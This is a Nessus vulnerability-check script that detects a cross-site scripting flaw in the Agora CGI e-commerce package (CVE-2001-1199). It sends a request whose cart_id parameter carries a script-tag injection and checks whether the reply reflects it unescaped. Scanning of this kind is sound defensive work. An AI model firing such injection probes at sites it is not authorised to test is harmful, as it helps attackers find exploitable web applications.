#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10836);
 script_bugtraq_id(3702);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2001-1199");
 
 name["english"] = "Agora CGI Cross Site Scripting";
 name["francais"] = "Agora CGI Cross Site Scripting";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a CGI which is vulnerable to a cross-site
scripting issue.

Description :

Agora is a CGI based e-commerce package. Due to poor input validation, 
Agora allows an attacker to execute cross-site scripting attacks. 


Solution : 

Upgrade to Agora 4.0e or newer.

Risk factor : 

Low / CVSS Base Score : 3
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:C)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for Agora CGI Cross Site Scripting";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore",
		francais:"Ce script est Copyright (C) 2002 Matt Moore");
 family["english"] = "CGI abuses : XSS";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if ( get_kb_item("www/" + port + "/generic_xss") ) exit(0);

if(get_port_state(port))
{ 
 req = http_get(item:"/store/agora.cgi?cart_id=<SCRIPT>alert(document.domain)</SCRIPT>&xm=on&product=HTML", port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if ( r == NULL ) exit(0);
 if("<SCRIPT>alert(document.domain)</SCRIPT>" >< r)	{
		security_note(port);
	}
}
